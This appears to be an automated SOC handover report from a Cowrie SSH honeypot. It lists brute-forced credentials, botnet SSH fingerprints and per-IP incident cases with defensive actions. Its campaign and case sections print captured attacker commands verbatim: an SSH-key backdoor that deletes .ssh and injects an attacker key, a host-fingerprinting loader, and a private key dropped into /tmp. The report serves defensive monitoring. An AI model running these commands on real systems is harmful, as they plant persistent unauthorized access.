# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-17 |
| **Generated At** | 2026-08-17T04:47:52Z |
| **Shift Time** | 04:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **5485** |
| Confirmed Threats | **5454** |
| False Positives Filtered | **31** (0.6%) |
| Unique Attacker IPs | **123** |
| Countries of Origin | **38** |
| High Severity Cases | **99** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **5386** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **128** |
| Unique Credential Pairs | **63** |
| Unique Usernames | **19** |
| Unique Passwords | **59** |
| Successful Auth Pairs | **111** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 42 |
| `admin` | 18 |
| `support` | 17 |
| `test` | 9 |
| `user` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234567` | 6 |
| `77777` | 6 |
| `123abc` | 6 |
| `administrator` | 6 |
| `!@#` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `user` | `77777` | 6 |
| `debian` | `123abc` | 6 |
| `support` | `administrator` | 6 |
| `root` | `!@#` | 5 |
| `test` | `1234567` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qweqaz123` | `45.142.193.164` | 2026-08-17T00:01:37 |
| `root` | `!@#` | `10.0.0.73` | 2026-08-17T00:08:17 |
| `root` | `!@#` | `95.35.29.192` | 2026-08-17T00:09:58 |
| `root` | `!@#` | `59.48.40.6` | 2026-08-17T00:10:06 |
| `test` | `1234567` | `122.160.15.31` | 2026-08-17T00:11:07 |
| `test` | `1234567` | `220.163.252.244` | 2026-08-17T00:11:17 |
| `nobody` | `passwd` | `112.31.93.229` | 2026-08-17T00:12:21 |
| `nobody` | `passwd` | `49.124.153.13` | 2026-08-17T00:12:30 |
| `nobody` | `passwd` | `81.214.75.248` | 2026-08-17T00:12:31 |
| `nobody` | `passwd` | `223.99.212.58` | 2026-08-17T00:12:42 |
| `ps` | `Password123!` | `217.165.22.192` | 2026-08-17T00:13:46 |
| `admin` | `admin` | `106.15.236.209` | 2026-08-17T00:14:46 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-17T00:14:46 |
| `root` | `office` | `45.142.193.164` | 2026-08-17T00:19:09 |
| `test` | `1234567` | `10.0.0.73` | 2026-08-17T00:22:21 |
| `support` | `support` | `10.0.0.73` | 2026-08-17T00:22:39 |
| `root` | `!@#` | `220.246.66.209` | 2026-08-17T00:25:42 |
| `Admin` | `Admin2022` | `10.0.0.73` | 2026-08-17T00:27:30 |
| `informix` | `informix` | `217.165.22.192` | 2026-08-17T00:32:53 |
| `root` | `Huawei@123` | `45.142.193.164` | 2026-08-17T00:36:45 |
| `test` | `1234567` | `49.124.152.232` | 2026-08-17T00:39:11 |
| `admin` | `888` | `120.234.195.41` | 2026-08-17T00:43:04 |
| `admin` | `888` | `113.11.34.221` | 2026-08-17T00:43:14 |
| `blank` | `123321` | `196.219.93.98` | 2026-08-17T00:44:25 |
| `blank` | `123321` | `119.200.229.33` | 2026-08-17T00:44:34 |
| `Admin` | `Admin2022` | `208.96.233.67` | 2026-08-17T00:45:42 |
| `Admin` | `Admin2022` | `196.188.187.85` | 2026-08-17T00:45:49 |
| `Admin` | `Admin2022` | `121.22.99.2` | 2026-08-17T00:45:56 |
| `Admin` | `Admin2022` | `117.248.201.39` | 2026-08-17T00:46:05 |
| `user` | `Abc123` | `217.165.22.192` | 2026-08-17T00:51:59 |
| `root` | `Aa123456` | `45.142.193.164` | 2026-08-17T00:54:26 |
| `blank` | `123321` | `10.0.0.73` | 2026-08-17T00:55:53 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-17T00:57:29 |
| `admin` | `888` | `64.72.74.162` | 2026-08-17T00:59:04 |
| `admin` | `888` | `106.245.246.26` | 2026-08-17T00:59:14 |
| `user` | `77777` | `10.0.0.73` | 2026-08-17T01:00:53 |
| `root` | `1` | `80.94.92.234` | 2026-08-17T01:02:18 |
| `root` | `12` | `80.94.92.234` | 2026-08-17T01:04:28 |
| `root` | `123` | `80.94.92.234` | 2026-08-17T01:06:55 |
| `root` | `1234` | `80.94.92.234` | 2026-08-17T01:09:25 |
| `grid` | `P@ssw0rd` | `217.165.22.192` | 2026-08-17T01:11:06 |
| `root` | `12345` | `80.94.92.234` | 2026-08-17T01:11:56 |
| `root` | `123@com` | `45.142.193.164` | 2026-08-17T01:12:02 |
| `blank` | `123321` | `31.41.81.65` | 2026-08-17T01:12:37 |
| `blank` | `123321` | `220.161.52.149` | 2026-08-17T01:12:45 |
| `steam` | `qwe123` | `4.246.117.137` | 2026-08-17T01:12:51 |
| `345gs5662d34` | `345gs5662d34` | `4.246.117.137` | 2026-08-17T01:12:53 |
| `steam` | `3245gs5662d34` | `4.246.117.137` | 2026-08-17T01:12:54 |
| `debian` | `123abc` | `10.0.0.73` | 2026-08-17T01:14:56 |
| `debian` | `123abc` | `116.59.10.205` | 2026-08-17T01:16:37 |
| `debian` | `123abc` | `36.137.38.119` | 2026-08-17T01:16:49 |
| `root` | `1234567` | `80.94.92.234` | 2026-08-17T01:17:06 |
| `test` | `qwerty123456` | `192.72.56.178` | 2026-08-17T01:17:40 |
| `user` | `77777` | `67.85.146.216` | 2026-08-17T01:18:59 |
| `user` | `77777` | `182.53.52.68` | 2026-08-17T01:19:09 |
| `user` | `77777` | `103.174.145.35` | 2026-08-17T01:19:12 |
| `user` | `77777` | `1.247.245.61` | 2026-08-17T01:19:21 |
| `support` | `support` | `176.53.159.196` | 2026-08-17T01:19:24 |
| `root` | `12345678` | `80.94.92.234` | 2026-08-17T01:19:53 |
| `root` | `123456789` | `80.94.92.234` | 2026-08-17T01:22:38 |
| `root` | `1234567890` | `80.94.92.234` | 2026-08-17T01:25:09 |
| `root` | `123qwe` | `80.94.92.234` | 2026-08-17T01:27:42 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-17T01:28:15 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-17T01:28:16 |
| `test` | `qwerty123456` | `10.0.0.73` | 2026-08-17T01:28:55 |
| `root` | `123qwerty` | `80.94.92.234` | 2026-08-17T01:30:08 |
| `info` | `P@ssw0rd123` | `217.165.22.192` | 2026-08-17T01:30:12 |
| `debian` | `123abc` | `94.228.240.2` | 2026-08-17T01:32:17 |
| `debian` | `123abc` | `114.30.180.58` | 2026-08-17T01:32:25 |
| `root` | `21` | `80.94.92.234` | 2026-08-17T01:32:27 |
| `admin` | `ubuntu` | `10.0.0.73` | 2026-08-17T01:34:10 |
| `root` | `321` | `80.94.92.234` | 2026-08-17T01:34:51 |
| `support` | `admin` | `45.154.244.193` | 2026-08-17T01:35:59 |
| `root` | `4321` | `80.94.92.234` | 2026-08-17T01:37:04 |
| `root` | `54321` | `80.94.92.234` | 2026-08-17T01:39:04 |
| `root` | `654321` | `80.94.92.234` | 2026-08-17T01:41:25 |
| `root` | `P4ssw0rd` | `80.94.92.234` | 2026-08-17T01:43:51 |
| `root` | `P4ssword` | `80.94.92.234` | 2026-08-17T01:46:23 |
| `root` | `Admin123456` | `45.142.193.164` | 2026-08-17T01:47:17 |
| `support` | `administrator` | `10.0.0.73` | 2026-08-17T01:48:19 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-08-17T01:48:51 |
| `dbadmin` | `ABCabc123` | `217.165.22.192` | 2026-08-17T01:49:18 |
| `support` | `administrator` | `203.75.170.63` | 2026-08-17T01:49:56 |
| `support` | `administrator` | `60.173.105.206` | 2026-08-17T01:50:05 |
| `support` | `webadmin` | `222.174.184.86` | 2026-08-17T01:50:54 |
| `admin` | `ubuntu` | `83.166.50.15` | 2026-08-17T01:52:09 |
| `admin` | `ubuntu` | `45.178.227.0` | 2026-08-17T01:52:28 |
| `admin` | `ubuntu` | `222.222.124.164` | 2026-08-17T01:52:39 |
| `support` | `webadmin` | `10.0.0.73` | 2026-08-17T02:02:20 |
| `root` | `Zxc123!@#` | `45.142.193.164` | 2026-08-17T02:04:48 |
| `support` | `administrator` | `202.111.183.30` | 2026-08-17T02:05:38 |
| `support` | `administrator` | `45.178.227.0` | 2026-08-17T02:05:47 |
| `test` | `Huawei12#$` | `217.165.22.192` | 2026-08-17T02:08:24 |
| `support` | `webadmin` | `122.187.237.122` | 2026-08-17T02:19:10 |
| `support` | `webadmin` | `65.20.175.6` | 2026-08-17T02:19:23 |
| `admin` | `netadmin` | `10.0.0.73` | 2026-08-17T02:21:39 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.80` | 2026-08-17T02:22:01 |
| `root` | `admin` | `73.147.19.171` | 2026-08-17T02:23:46 |
| `centos` | `44444` | `62.220.104.155` | 2026-08-17T02:24:25 |
| `centos` | `44444` | `170.247.3.15` | 2026-08-17T02:24:37 |
| `admin` | `Abc123456` | `117.248.201.39` | 2026-08-17T02:25:47 |
| `admin` | `Abc123456` | `117.241.77.78` | 2026-08-17T02:25:56 |
| `oracle` | `oracle` | `217.165.22.192` | 2026-08-17T02:27:30 |
| `centos` | `44444` | `10.0.0.73` | 2026-08-17T02:35:58 |
| `admin` | `netadmin` | `175.198.18.3` | 2026-08-17T02:39:25 |
| `admin` | `netadmin` | `180.71.9.31` | 2026-08-17T02:39:41 |
| `root` | `q1w2e3r4` | `10.0.0.73` | 2026-08-17T02:41:01 |
| `root` | `123456789` | `217.165.22.192` | 2026-08-17T02:46:37 |
| `admin` | `admin` | `34.62.116.50` | 2026-08-17T02:46:52 |
| `centos` | `44444` | `96.56.228.149` | 2026-08-17T02:52:40 |
| `centos` | `44444` | `222.75.225.206` | 2026-08-17T02:52:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **5485** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 51 |
| Go SSH scanner | 48 |
| Paramiko (Python) | 12 |
| Unknown | 6 |
| libssh | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 51 | 49 |
| `2ec37a7cc8da...` | Mirai/variant | 20 | 1 |
| `e45f2d6d7f79...` | Mirai/variant | 9 | 1 |
| `87e3d9ffee05...` | Mirai/variant | 8 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 51 | 49 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 1 | Mirai/variant |
| `e45f2d6d7f79...` | Go SSH scanner | 9 | 1 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `95420f9d932d...` | Unknown | 5 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 4 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 19 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `4.246.117.137`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **123** |
| Unique ASNs | **80** |
| High-Risk ASNs | **66** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (99)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d76d131318a0

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 00:01 |
| **Last Seen** | 2026-08-17 00:01 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:01:09` | `cowrie.session.connect` |
| `2026-08-17 00:01:13` | `cowrie.client.version` |
| `2026-08-17 00:01:13` | `cowrie.client.kex` |
| `2026-08-17 00:01:37` | `cowrie.login.success` |
| `2026-08-17 00:01:52` | `cowrie.session.params` |
| `2026-08-17 00:01:52` | `cowrie.command.input` |
| `2026-08-17 00:01:58` | `cowrie.log.closed` |
| `2026-08-17 00:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0404dc91f671

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-08-17 00:09 |
| **Last Seen** | 2026-08-17 00:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:09:56` | `cowrie.session.connect` |
| `2026-08-17 00:09:56` | `cowrie.client.version` |
| `2026-08-17 00:09:56` | `cowrie.client.kex` |
| `2026-08-17 00:09:58` | `cowrie.login.success` |
| `2026-08-17 00:09:58` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4534ef9b9cbc

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-08-17 00:10 |
| **Last Seen** | 2026-08-17 00:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:10:03` | `cowrie.session.connect` |
| `2026-08-17 00:10:04` | `cowrie.client.version` |
| `2026-08-17 00:10:04` | `cowrie.client.kex` |
| `2026-08-17 00:10:06` | `cowrie.login.success` |
| `2026-08-17 00:10:07` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e2c74a1115

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-17 00:11 |
| **Last Seen** | 2026-08-17 00:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:11:03` | `cowrie.session.connect` |
| `2026-08-17 00:11:04` | `cowrie.client.version` |
| `2026-08-17 00:11:04` | `cowrie.client.kex` |
| `2026-08-17 00:11:07` | `cowrie.login.success` |
| `2026-08-17 00:11:08` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-167a8ec4b450

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-08-17 00:11 |
| **Last Seen** | 2026-08-17 00:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:11:14` | `cowrie.session.connect` |
| `2026-08-17 00:11:15` | `cowrie.client.version` |
| `2026-08-17 00:11:15` | `cowrie.client.kex` |
| `2026-08-17 00:11:17` | `cowrie.login.success` |
| `2026-08-17 00:11:17` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b2bdbe4926

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-08-17 00:12 |
| **Last Seen** | 2026-08-17 00:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:12:17` | `cowrie.session.connect` |
| `2026-08-17 00:12:18` | `cowrie.client.version` |
| `2026-08-17 00:12:18` | `cowrie.client.kex` |
| `2026-08-17 00:12:21` | `cowrie.login.success` |
| `2026-08-17 00:12:22` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-274e3a206001

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]13` |
| **First Seen** | 2026-08-17 00:12 |
| **Last Seen** | 2026-08-17 00:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:12:28` | `cowrie.session.connect` |
| `2026-08-17 00:12:28` | `cowrie.client.version` |
| `2026-08-17 00:12:28` | `cowrie.client.kex` |
| `2026-08-17 00:12:30` | `cowrie.login.success` |
| `2026-08-17 00:12:31` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]13` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4c2264eb96

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-17 00:12 |
| **Last Seen** | 2026-08-17 00:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:12:29` | `cowrie.session.connect` |
| `2026-08-17 00:12:30` | `cowrie.client.version` |
| `2026-08-17 00:12:30` | `cowrie.client.kex` |
| `2026-08-17 00:12:31` | `cowrie.login.success` |
| `2026-08-17 00:12:31` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3603834759d4

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-17 00:12 |
| **Last Seen** | 2026-08-17 00:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:12:38` | `cowrie.session.connect` |
| `2026-08-17 00:12:39` | `cowrie.client.version` |
| `2026-08-17 00:12:39` | `cowrie.client.kex` |
| `2026-08-17 00:12:42` | `cowrie.login.success` |
| `2026-08-17 00:12:42` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d5d0e79d73

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 00:13 |
| **Last Seen** | 2026-08-17 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:13:46` | `cowrie.session.connect` |
| `2026-08-17 00:13:46` | `cowrie.client.version` |
| `2026-08-17 00:13:46` | `cowrie.client.kex` |
| `2026-08-17 00:13:46` | `cowrie.login.success` |
| `2026-08-17 00:13:47` | `cowrie.session.params` |
| `2026-08-17 00:13:47` | `cowrie.command.input` |
| `2026-08-17 00:13:48` | `cowrie.log.closed` |
| `2026-08-17 00:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2107e14554

| Field | Detail |
|---|---|
| **Source IP** | `106.15.236[.]209` |
| **First Seen** | 2026-08-17 00:14 |
| **Last Seen** | 2026-08-17 00:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:14:45` | `cowrie.session.connect` |
| `2026-08-17 00:14:45` | `cowrie.client.version` |
| `2026-08-17 00:14:45` | `cowrie.client.kex` |
| `2026-08-17 00:14:46` | `cowrie.login.success` |
| `2026-08-17 00:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.15.236[.]209` to AbuseIPDB if not already reported
- [ ] Block `106.15.236[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd09b53e5b49

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-17 00:14 |
| **Last Seen** | 2026-08-17 00:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:14:46` | `cowrie.session.connect` |
| `2026-08-17 00:14:46` | `cowrie.client.version` |
| `2026-08-17 00:14:46` | `cowrie.client.kex` |
| `2026-08-17 00:14:46` | `cowrie.login.success` |
| `2026-08-17 00:14:48` | `cowrie.session.params` |
| `2026-08-17 00:14:48` | `cowrie.command.input` |
| `2026-08-17 00:14:48` | `cowrie.session.file_download` |
| `2026-08-17 00:14:48` | `cowrie.session.file_download` |
| `2026-08-17 00:14:48` | `cowrie.log.closed` |
